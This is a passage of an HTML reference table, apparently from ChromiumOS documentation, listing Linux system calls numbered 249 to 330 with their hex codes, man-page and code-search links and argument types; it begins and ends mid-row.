align="center"><a href="https://man7.org/linux/man-pages/man2/io_cancel.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_cancel">cs/</a></td><td align="center">0xf9</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">250</td><td>fadvise64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fadvise64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fadvise64">cs/</a></td><td align="center">0xfa</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td>-</td><td>-</td></tr><tr><td align="center">251</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfb</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">252</td><td>exit_group</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit_group.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit_group">cs/</a></td><td align="center">0xfc</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">253</td><td>lookup_dcookie</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lookup_dcookie.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lookup_dcookie">cs/</a></td><td align="center">0xfd</td><td>u64 cookie64</td><td>char *buf</td><td>size_t len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">254</td><td>epoll_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create">cs/</a></td><td align="center">0xfe</td><td>int size</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">255</td><td>epoll_ctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_ctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_ctl">cs/</a></td><td align="center">0xff</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td>-</td><td>-</td></tr><tr><td align="center">256</td><td>epoll_wait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_wait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_wait">cs/</a></td><td align="center">0x100</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>-</td><td>-</td></tr><tr><td align="center">257</td><td>remap_file_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/remap_file_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*remap_file_pages">cs/</a></td><td align="center">0x101</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">258</td><td>set_tid_address</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_tid_address.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_tid_address">cs/</a></td><td align="center">0x102</td><td>int *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">259</td><td>timer_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_create">cs/</a></td><td align="center">0x103</td><td>clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t * created_timer_id</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">260</td><td>timer_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_settime">cs/</a></td><td align="center">0x104</td><td>timer_t timer_id</td><td>int flags</td><td>const struct __kernel_itimerspec *new_setting</td><td>struct __kernel_itimerspec *old_setting</td><td>-</td><td>-</td></tr><tr><td align="center">261</td><td>timer_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_gettime">cs/</a></td><td align="center">0x105</td><td>timer_t timer_id</td><td>struct __kernel_itimerspec *setting</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">262</td><td>timer_getoverrun</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_getoverrun.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_getoverrun">cs/</a></td><td align="center">0x106</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">263</td><td>timer_delete</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_delete.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_delete">cs/</a></td><td align="center">0x107</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">264</td><td>clock_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_settime">cs/</a></td><td align="center">0x108</td><td>clockid_t which_clock</td><td>const struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">265</td><td>clock_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_gettime">cs/</a></td><td align="center">0x109</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">266</td><td>clock_getres</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_getres.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_getres">cs/</a></td><td align="center">0x10a</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">267</td><td>clock_nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_nanosleep">cs/</a></td><td align="center">0x10b</td><td>clockid_t which_clock</td><td>int flags</td><td>const struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td></tr><tr><td align="center">268</td><td>statfs64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs64">cs/</a></td><td align="center">0x10c</td><td>const char *path</td><td>size_t sz</td><td>struct statfs64 *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">269</td><td>fstatfs64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs64">cs/</a></td><td align="center">0x10d</td><td>unsigned int fd</td><td>size_t sz</td><td>struct statfs64 *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">270</td><td>tgkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tgkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tgkill">cs/</a></td><td align="center">0x10e</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">271</td><td>utimes</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimes.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimes">cs/</a></td><td align="center">0x10f</td><td>char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">272</td><td>fadvise64_64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fadvise64_64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fadvise64_64">cs/</a></td><td align="center">0x110</td><td>int fd</td><td>loff_t offset</td><td>loff_t len</td><td>int advice</td><td>-</td><td>-</td></tr><tr><td align="center">273</td><td>vserver</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vserver.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vserver">cs/</a></td><td align="center">0x111</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">274</td><td>mbind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mbind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mbind">cs/</a></td><td align="center">0x112</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td align="center">275</td><td>get_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_mempolicy">cs/</a></td><td align="center">0x113</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">276</td><td>set_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_mempolicy">cs/</a></td><td align="center">0x114</td><td>int mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">277</td><td>mq_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_open">cs/</a></td><td align="center">0x115</td><td>const char *name</td><td>int oflag</td><td>umode_t mode</td><td>struct mq_attr *attr</td><td>-</td><td>-</td></tr><tr><td align="center">278</td><td>mq_unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_unlink">cs/</a></td><td align="center">0x116</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">279</td><td>mq_timedsend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedsend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedsend">cs/</a></td><td align="center">0x117</td><td>mqd_t mqdes</td><td>const char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">280</td><td>mq_timedreceive</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedreceive.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedreceive">cs/</a></td><td align="center">0x118</td><td>mqd_t mqdes</td><td>char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int *msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">281</td><td>mq_notify</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_notify.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_notify">cs/</a></td><td align="center">0x119</td><td>mqd_t mqdes</td><td>const struct sigevent *notification</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">282</td><td>mq_getsetattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_getsetattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_getsetattr">cs/</a></td><td align="center">0x11a</td><td>mqd_t mqdes</td><td>const struct mq_attr *mqstat</td><td>struct mq_attr *omqstat</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">283</td><td>kexec_load</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kexec_load.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kexec_load">cs/</a></td><td align="center">0x11b</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td>-</td><td>-</td></tr><tr><td align="center">284</td><td>waitid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/waitid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*waitid">cs/</a></td><td align="center">0x11c</td><td>int which</td><td>pid_t pid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td>-</td></tr><tr><td align="center">285</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x11d</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">286</td><td>add_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/add_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*add_key">cs/</a></td><td align="center">0x11e</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td>-</td></tr><tr><td align="center">287</td><td>request_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/request_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*request_key">cs/</a></td><td align="center">0x11f</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td>-</td></tr><tr><td align="center">288</td><td>keyctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/keyctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*keyctl">cs/</a></td><td align="center">0x120</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">289</td><td>ioprio_set</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_set.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_set">cs/</a></td><td align="center">0x121</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">290</td><td>ioprio_get</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_get.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_get">cs/</a></td><td align="center">0x122</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">291</td><td>inotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init">cs/</a></td><td align="center">0x123</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">292</td><td>inotify_add_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_add_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_add_watch">cs/</a></td><td align="center">0x124</td><td>int fd</td><td>const char *path</td><td>u32 mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">293</td><td>inotify_rm_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_rm_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_rm_watch">cs/</a></td><td align="center">0x125</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">294</td><td>migrate_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/migrate_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*migrate_pages">cs/</a></td><td align="center">0x126</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long *from</td><td>const unsigned long *to</td><td>-</td><td>-</td></tr><tr><td align="center">295</td><td>openat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/openat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*openat">cs/</a></td><td align="center">0x127</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td></tr><tr><td align="center">296</td><td>mkdirat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdirat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdirat">cs/</a></td><td align="center">0x128</td><td>int dfd</td><td>const char * pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">297</td><td>mknodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknodat">cs/</a></td><td align="center">0x129</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td></tr><tr><td align="center">298</td><td>fchownat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchownat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchownat">cs/</a></td><td align="center">0x12a</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td>-</td></tr><tr><td align="center">299</td><td>futimesat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futimesat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futimesat">cs/</a></td><td align="center">0x12b</td><td>int dfd</td><td>const char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">300</td><td>fstatat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatat64">cs/</a></td><td align="center">0x12c</td><td>int dfd</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>int flag</td><td>-</td><td>-</td></tr><tr><td align="center">301</td><td>unlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlinkat">cs/</a></td><td align="center">0x12d</td><td>int dfd</td><td>const char * pathname</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">302</td><td>renameat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat">cs/</a></td><td align="center">0x12e</td><td>int olddfd</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td></tr><tr><td align="center">303</td><td>linkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/linkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*linkat">cs/</a></td><td align="center">0x12f</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>int flags</td><td>-</td></tr><tr><td align="center">304</td><td>symlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlinkat">cs/</a></td><td align="center">0x130</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">305</td><td>readlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlinkat">cs/</a></td><td align="center">0x131</td><td>int dfd</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td></tr><tr><td align="center">306</td><td>fchmodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmodat">cs/</a></td><td align="center">0x132</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">307</td><td>faccessat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/faccessat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*faccessat">cs/</a></td><td align="center">0x133</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">308</td><td>pselect6</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pselect6.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pselect6">cs/</a></td><td align="center">0x134</td><td>int</td><td>fd_set *</td><td>fd_set *</td><td>fd_set *</td><td>struct __kernel_timespec *</td><td>void *</td></tr><tr><td align="center">309</td><td>ppoll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ppoll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ppoll">cs/</a></td><td align="center">0x135</td><td>struct pollfd *</td><td>unsigned int</td><td>struct __kernel_timespec *</td><td>const sigset_t *</td><td>size_t</td><td>-</td></tr><tr><td align="center">310</td><td>unshare</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unshare.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unshare">cs/</a></td><td align="center">0x136</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">311</td><td>set_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_robust_list">cs/</a></td><td align="center">0x137</td><td>struct robust_list_head *head</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">312</td><td>get_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_robust_list">cs/</a></td><td align="center">0x138</td><td>int pid</td><td>struct robust_list_head * *head_ptr</td><td>size_t *len_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">313</td><td>splice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/splice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*splice">cs/</a></td><td align="center">0x139</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">314</td><td>sync_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync_file_range">cs/</a></td><td align="center">0x13a</td><td>int fd</td><td>loff_t offset</td><td>loff_t nbytes</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">315</td><td>tee</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tee.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tee">cs/</a></td><td align="center">0x13b</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">316</td><td>vmsplice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vmsplice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vmsplice">cs/</a></td><td align="center">0x13c</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">317</td><td>move_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/move_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*move_pages">cs/</a></td><td align="center">0x13d</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void * *pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td align="center">318</td><td>getcpu</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcpu.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcpu">cs/</a></td><td align="center">0x13e</td><td>unsigned *cpu</td><td>unsigned *node</td><td>struct getcpu_cache *cache</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">319</td><td>epoll_pwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_pwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_pwait">cs/</a></td><td align="center">0x13f</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td align="center">320</td><td>utimensat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimensat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimensat">cs/</a></td><td align="center">0x140</td><td>int dfd</td><td>const char *filename</td><td>struct __kernel_timespec *utimes</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">321</td><td>signalfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd">cs/</a></td><td align="center">0x141</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">322</td><td>timerfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_create">cs/</a></td><td align="center">0x142</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">323</td><td>eventfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd">cs/</a></td><td align="center">0x143</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">324</td><td>fallocate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fallocate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fallocate">cs/</a></td><td align="center">0x144</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>-</td></tr><tr><td align="center">325</td><td>timerfd_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_settime">cs/</a></td><td align="center">0x145</td><td>int ufd</td><td>int flags</td><td>const struct __kernel_itimerspec *utmr</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td></tr><tr><td align="center">326</td><td>timerfd_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_gettime">cs/</a></td><td align="center">0x146</td><td>int ufd</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">327</td><td>signalfd4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd4">cs/</a></td><td align="center">0x147</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">328</td><td>eventfd2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd2">cs/</a></td><td align="center">0x148</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">329</td><td>epoll_create1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create1">cs/</a></td><td align="center">0x149</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">330</td><td>dup3</td><td 